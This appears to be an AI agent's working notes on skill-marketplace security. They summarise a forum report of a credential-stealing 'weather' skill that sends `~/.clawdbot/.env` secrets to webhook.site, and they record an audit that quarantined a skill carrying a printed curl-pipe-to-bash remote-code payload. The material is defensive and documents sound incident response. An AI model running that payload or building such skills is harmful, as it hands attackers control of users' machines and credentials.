## Security Alert - ClawdHub Skill Vulnerabilities

**Source:** Moltbook post by eudaemon_0 (2303 upvotes, 10683 comments)
**Discovery:** Rufio scanned 286 ClawdHub skills with YARA rules, found 1 credential stealer

### The Attack Found
- **Disguise:** Weather skill
- **Behavior:** Reads `~/.clawdbot/.env` and exfiltrates secrets to webhook.site
- **Risk:** 1,261 registered moltys — if 10% install a popular skill unchecked = 126 compromised agents

### Current Gaps (What We Don't Have)
1. **No code signing** for skills (npm has signatures; ClawdHub does not)
2. **No reputation system** for skill authors
3. **No sandboxing** — installed skills run with full agent permissions
4. **No audit trail** of what a skill accesses
5. **No equivalent** of npm audit, Snyk, or Dependabot

### Proposed Solutions
1. **Signed skills** — Author identity verified through Moltbook
2. **Isnad chains** — Provenance chain: who wrote, audited, vouches (like Islamic hadith authentication)
3. **Permission manifests** — Skill declares needed access (filesystem, network, API keys) before install
4. **Community audit** — Agents run YARA scans, publish results, build collective immunity

### Our Action Items
- [ ] Audit currently installed skills (check for suspicious file/network access patterns)
- [ ] Review any skills before installing — don't auto-install without reading source
- [ ] Consider creating a trust tier system for skill authors
- [x] Check if skill scanner skill is available on ClawHub — ✅ INSTALLED (ai-skill-scanner v2.1.0)

**Key principle:** Newest agents are most at risk — they're excited, want to try everything, haven't learned suspicion yet.

## Security Audit Results (Completed 2026-02-04 10:04 GMT)

### 🚨 MALICIOUS SKILL FOUND & QUARANTINED
- **Skill:** `agent-browser-jrdv4mcscrb2`
- **Disguise:** Browser automation tool
- **Payload:** Base64-encoded RCE: `/bin/bash -c "$(curl -fsSL http://91.92.242.30/lamq4uerkruo6ssm)"`
- **Action:** Moved to `/Users/quentincasares/.openclaw/quarantine/`

### ✅ CLEAN Skills (7)
agent-security-audit, ai-skill-scanner, auto-updater, gog, humanize, pdf, tweet-writer

### ℹ️ FALSE POSITIVES (Legitimate tools flagged by scanner)
- **skillboss** — Multi-provider AI API gateway (flagged for reading config + API calls)
- **moltbook-interact** — Reads auth files for legitimate Moltbook API access

### Actions Completed
1. Scanned all 16 installed skills with ai-skill-scanner
2. Quarantined 1 confirmed malicious skill
3. Verified `~/.clawdbot/.env` does not exist (attack didn't apply)
4. Created blocklist script for 20 known exfiltration domains
5. Generated 22KB security framework roadmap document

### Remaining Action
Run `sudo bash /Users/quentincasares/.openclaw/workspace/block-malicious-domains.sh` to block malicious domains system-wide.

## Session Notes
- User (Q) explicitly flagged this as high-priority security concern
- Need to be extra cautious with skill installations going forward
